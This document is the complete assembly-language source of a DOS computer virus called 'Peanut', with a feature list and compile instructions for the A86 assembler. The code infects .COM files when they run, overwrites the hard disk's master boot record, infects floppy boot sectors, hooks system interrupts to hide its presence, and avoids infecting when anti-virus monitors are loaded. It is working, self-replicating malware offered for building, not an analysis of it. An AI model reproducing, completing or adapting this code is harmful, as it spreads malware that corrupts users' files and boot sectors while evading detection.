;=============================================================================
;       Virus Name:  Peanut
; Effective Length:  445 Bytes
;
;            Notes:  
;                  - resident, stealth, multipartite, appending .COM infector
;                  - infects .COM files when they are executed
;                  - preserves host file's date/time stamp
;                  - I/O error messages trapped by virus int24 handler 
;                  - infects fixed disk MBR
;                  - post-infection MBR write protection
;                  - infects boot sectors of all floppy formats on all drives
;                  - MBR/floppy boot sector stealth
;                  - boot sector infection not attempted when TSR A-V monitor
;                    is present
;                  - virus fits into a single boot or MBR sector
;
;       To Compile:
;                  - use A86 assembler
;                  - type "a86 peanut.a86"
;=============================================================================

boot            equ     0108            ;delta offset for boot location
com             equ     0104            ;delta offset for resident location
viruslength     equ     01bd            ;virus length = 445 bytes

peanut:
                db      'M'             ;infection tag at beginning of file
        jmp     start                   ;jump to virus code

COM_bytes       db      0cd, 020        ;COM file's original
                dw      ?               ; first four bytes

start:
        call    relative                ;call for offset determination

;-----------------------------------------------------------------------------
; Relative - determines whether virus is executing from file or at boot time
; by checking segment registers, all of which will be set to the same value if 
; the virus code is executing from a .COM file host.
;-----------------------------------------------------------------------------

relative:                                                                       
        pop     bp                      ;pop offset off of stack

        push    cs
        pop     ax                      ;set ax=cs
        push    ss
        pop     bx                      ;set bx=ss
        cmp     ax,bx                   ;cs=ss?
        jne     boot_time               ;if not, must be executing at boot
                                        ; time, so jump to boot routine


;-----------------------------------------------------------------------------
; File_time - infects fixed disk Master Boot Record (MBR) if not already 
; infected, restores host .COM file's first four bytes at beginning of file, 
; and jumps to execute host.                                
;-----------------------------------------------------------------------------

file_time:
        lea     bx,[bp+viruslength-03]  ;set load offset just beyond program
        lea     si,[bp-03]              ;set source offset to start of virus
        call    infect_MBR              ;check/infect MBR

        mov     di,0100                 ;COM file entry point & move dest.
        push    di                      ;save on stack as return offset 
        lea     si,[bp-07]              ;point to stored COM 1st four bytes
        movsw                           ;move the original four bytes
        movsw                           ; back to the start of the COM file
        ret                             ;return to execute the COM file
                                        ; (return segment already on stack)

;-----------------------------------------------------------------------------
; Boot_time - infects MBR if not already infected, steals int13, installs 
; virus in memory. 
;-----------------------------------------------------------------------------

boot_time:
        xor     ax,ax                   ;zero ax
        mov     ds,ax                   ;point ds to vector table
     
        mov     si,07c00                ;set source offset for virus move

        cli                             ;disable interrupts
        mov     ss,ax                   ;set stack segment              
        mov     sp,si                   ;set stack pointer              
        sti                             ;enable interrupts
        
        push    ds                      ;save segment for int13 theft
        push    si                      ;save load offset for original MBR
        push    ds                      ;save load segment for original MBR

        sub     word ptr [0413],01      ;decrease conventional memory by 1KB
        int     012                     ;load ax with #KB of conv. memory

        mov     cl,06                   ;set shift value
        shl     ax,cl                   ;calculate destination segment

        mov     es,ax                   ;set es to destination segment

        cmp     dl,080                  ;booting from drive "C"?
        je      steal_int13             ;if so, keep si=07c00
        add     si,03e                  ;otherwise, change si to floppy offset
                                        ; of viral code
steal_int13:
        xchg    [013*4+2],ax            ;point int13 vector to virus segment
        mov     [si+offset old13-boot+2],ax ;store old int13 segment value
        mov     ax,offset chain-com     ;load ax with offset of chain to int13 
        xchg    [013*4],ax              ;point int13 vector to virus offset
        mov     [si+offset old13-boot],ax ;store old int13 offset value

        mov     ch,01                   ;set move count (cx=106h)
        mov     di,04                   ;set destination offset=0004
        push    di                      ;save it for later use as source off.

        cld                             ;clear direction flag (fwd)
        rep     movsw                   ;move virus to top of conv. memory

        push    es                      ;push destination segment for retf
        mov     ax,offset top_mem-com   ;load bx with offset
        push    ax                      ;push offset for retf
        retf                            ;return to self at new location

top_mem:
        pop     si                      ;set si to source offset of virus
        pop     es                      ;pop es=0000 as disk load segment
        pop     bx                      ;set bx=07c00 as disk load offset
                                        
        push    cs
        pop     ds                      ;set ds to source segment of virus

        call    infect_MBR              ;check/infect MBR and load original

        pop     ds                      ;point to vector table segment

        mov     word ptr [013*4],offset int13-com ;enable virus int13 handler

        jmp     0000:07c00              ;jump to execute original MBR

;-----------------------------------------------------------------------------
; Infect_MBR - infects MBR if not already infected.
;-----------------------------------------------------------------------------

infect_MBR:
        mov     ax,0201                 ;read-one-sector function
        mov     cx,01                   ;cylinder 0, sector 1 (MBR)
        mov     dx,080                  ;head 0, drive "C"
        int     013                     ;load MBR
        jc      exit_MBR                ;if flag=error, exit

        cmp     byte ptr es:[bx],0e8    ;check for peanut virus code
        je      exit_MBR                ;if equal, MBR already infected, so
                                        ; exit
        mov     ax,0301                 ;write-one-sector function
        inc     cx                      ;cylinder 0, sector 2
        int     013                     ;relocate original MBR to sector 2

        mov     di,bx                   ;set dest. offset to MBR in buffer
        mov     cx,viruslength-04       ;load move count to cx
        cld                             ;clear direction flag (fwd)
        rep     movsb                   ;move virus to MBR in memory

        mov     ax,0301                 ;write-one-sector function
        inc     cx                      ;cylinder 0, sector 1 (MBR)
        int     013                     ;write infected MBR to drive "C"

exit_MBR:
        mov     ax,0201                 ;read-one-sector function
        inc     cx                      ;cylinder 0, sector 2 (original MBR)
        int     013                     ;load MBR for possible execution (if
                                        ; boot-time)
        ret

;-----------------------------------------------------------------------------
; INT13 Handler - steals int21 upon execution of first .EXE file to avoid 
; problems on systems which load DOS high, provides MBR stealth/write protect,
; infects floppies except when TSR A-V monitoring program is present and 
; provides floppy stealth by zeroing out the virus code in the disk I/O buffer 
; containing the infected boot sector.  Original floppy boot sector is not 
; relocated, system simply boots from hard drive after boot from an infected 
; floppy.  This is VERY easy to miss if the boot from floppy is unintentional,
; as it usually is.   
;-----------------------------------------------------------------------------

int13:
        push    ds                      ;preserve registers
        push    ax

        xor     ax,ax                   ;zero ax
        mov     ds,ax                   ;point ds to vector table

        cmp     word ptr es:[bx],'ZM'   ;EXE file being accessed?
        jne     MBR_stealth             ;if not, don't steal int21 yet

        cmp     [0b9*4+2],ax            ;bypass flag set (intb9 segment <> 00)?
        jne     MBR_stealth             ;if so, don't steal int21 vector again

        mov     ax,cs                   ;set ax=cs
        xchg    [021*4+2],ax            ;point int21 vector to virus segment
        mov     [0b9*4+2],ax            ;point unused vector to DOS int21
        mov     cs:[offset old21-com+2],ax ;store original segment in virus
        mov     ax,offset int21-com     ;load ax with virus int21 handler off.
        xchg    [021*4],ax              ;point int21 vector to virus offset
        mov     [0b9*4],ax              ;point unused vector to DOS int21
        mov     cs:[offset old21-com],ax ;store original offset in virus

MBR_stealth:
        pop     ax                      ;restore ax

        cmp     cx,01                   ;cylinder 0, sector 1?
        jne     exit_int13              ;if not, no need for stealth, so exit

        cmp     dx,080                  ;head 0, drive "C"?
        ja      exit_int13              ;if above, not accessing drive "C" MBR
        jb      infect_floppy           ;if below, must be floppy access

        cmp     ah,03                   ;write request?
        je      sim_IO                  ;if so, simulate write

        inc     cx                      ;point to original MBR (sector 2)
        call    bios_int13              ;load it to buffer
        dec     cx                      ;restore cx to original value (1)

sim_IO:
        xor     ah,ah                   ;set ah=0 to simulate success
        clc                             ;clear carry flag for same

read_fail:
        pop     ds                      ;restore ds
        retf    02                      ;return to calling routine

infect_floppy:
        cmp     ah,02                   ;read request?
        jne     exit_int13              ;if not, exit

        call    bios_int13              ;read boot record
        jc      read_fail               ;if flag=fail, exit       

        mov     es:[bx],03ceb           ;write "jmp" (over BPB) at start of 
                                        ; boot record in buffer
        push    si                      ;preserve registers
        push    di

        mov     si,04                   ;set virus source offset for move
        lea     di,[bx+03e]             ;set destination offset to beyond BPB
        mov     cx,viruslength-04       ;set move count 

        cmp     byte ptr [040*4+3],0c0  ;int40 pointing to ROM?
        push    cs
        pop     ds                      ;set ds=cs
        jb      floppy_stealth          ;if int40 not pointing to ROM, A-V   
                                        ; monitor is present, do not infect
        push    di                      ;save these for
        push    cx                      ; later use

        cld                             ;clear direction flag (fwd)
        rep     movsb                   ;infect boot record in buffer

        mov     ax,0301                 ;write-one-sector function
        inc     cx                      ;track 0, sector 1
        call    bios_int13              ;write infected boot record

        pop     cx                      ;restore move count 
        pop     di                      ; and destination offset

floppy_stealth:
        xor     ax,ax                   ;set al to dummy byte (00)
        rep     stosb                   ;overwrite virus code in boot record
                                        ; buffer (for stealth)
        inc     ax                      ;restore ax to original value (1)
        inc     cx                      ;restore cx to original value (1)

        pop     di                      ;restore registers
        pop     si

        jmp     sim_IO                  ;return sanitized boot record to
                                        ; calling routine
exit_int13:
        pop     ds                      ;restore ds

chain   db      0ea                     ;"jmp far" to location specified in
                                        ; old13
old13   dw      ?, ?                    ;offset and segment of original int13
                                        ; handler
bios_int13:
        pushf
        cs:
        call    dword ptr [offset old13-com]  ;call original int13
        ret

;-----------------------------------------------------------------------------
; INT24 Critical Error "Handler" - hides floppy write-protect errors during 
; file infection attempts.   
;-----------------------------------------------------------------------------

int24:
        mov     al,03                   ;set al to fail disk I/O errors
        iret

;-----------------------------------------------------------------------------
; INT21 Handler - (a modified/improved Tiny 133) infects COM files when
; executed, retains file date/time.  
;-----------------------------------------------------------------------------

file_IO1:
        mov     ah,042                  ;move file pointer function
        cwd                             ;set dx=0000 (LSP)
file_IO2:                        
        xor     cx,cx                   ;set cx=0000 (MSP)
        int     0b9                     ;int21 (set file pointer [FP] to BOF)
        mov     cl,04                   ;set file read/write count
        xchg    si,ax                   ;store FP (IO1 call) or handle (IO2)
        mov     ah,040                  ;write to file w/handle function
        xor     di,di                   ;read/write destination offset
        ret              

int21:                                                                         
        cmp     ax,04B00                ;execute file request?
        jne     exit_int21              ;if not, exit

        push    ax                      ;preserve registers
        push    bx          
        push    dx          
        push    ds          
        push    es          

        mov     ax,03D02                ;open file read/write and get handle
        call    file_IO2                ;int21 
        jc      open_fail               ;if file attrib. not read/write, exit

        mov     ax,03524                ;get int24 vector function
        int     0b9                     ;int21
        push    es                      ;save original int24 segment
        push    bx                      ; and offset

        mov     ax,05700                ;get file date/time function
        mov     bx,si                   ;move handle to bx
        int     0b9                     ;int21
        push    cx                      ;save original file time
        push    dx                      ; and date

        push    cs
        pop     ds                      ;set ds=cs
        push    cs
        pop     es                      ;set es=cs

        mov     ax,02524                ;set int24 vector function
        mov     dx,offset int24-com     ;set dx to offset of our int24 handler
        call    file_IO2                ;int21 (steal int24)

        mov     ah,03F                  ;read file w/handle function
        cwd                             ;set pointer to buffer offset (0)
        int     0b9                     ;int21 (read file's 1st four bytes)

        mov     al,'M'                  ;set al=infection tag
        scasb                           ;check file's first byte for tag
        je      close_file              ;if equal, already infected or
                                        ; EXE file
        mov     al,02                   ;move FP, offset (0) from EOF
        call    file_IO1                ;int21 (reset FP to EOF)

        mov     cx,viruslength          ;set write count to virus length
        int     0b9                     ;int21 (write virus to EOF)
        jc      close_file              ;if failed, exit

        mov     ax,0E94D                ;"jmp" and "M" infection tag
        stosw                           ;write to disk I/O buffer area
        xchg    ax,si                   ;set ax=FP
        stosw                           ;write jump offset to I/O buffer area
        xchg    dx,ax                   ;set al=00 (FP offset (0) from BOF)
        call    file_IO1                ;set FP to BOF
        int     0b9                     ;int21 (write I/O buffer contents
                                        ; to BOF)
close_file:                            
        pop     dx                      ;get original file date
        pop     cx                      ; and time
        mov     ax,05701                ;set file date/time function
        int     0b9                     ;int21

        mov     ah,03E                  ;close file w/handle function
        int     0b9                     ;int21

        pop     dx                      ;get original int24 vector offset
        pop     ds                      ; and segment
        mov     ax,02524                ;set int24 vector function
        int     0b9                     ;int21

open_fail:                            
        pop     es                      ;restore registers
        pop     ds          
        pop     dx          
        pop     bx          
        pop     ax          

exit_int21:

        db      0ea                     ;"jmp far" to location specified in
                                        ; old21
old21   dw      ?, ?                    ;offset and segment of original int21

        end     peanut

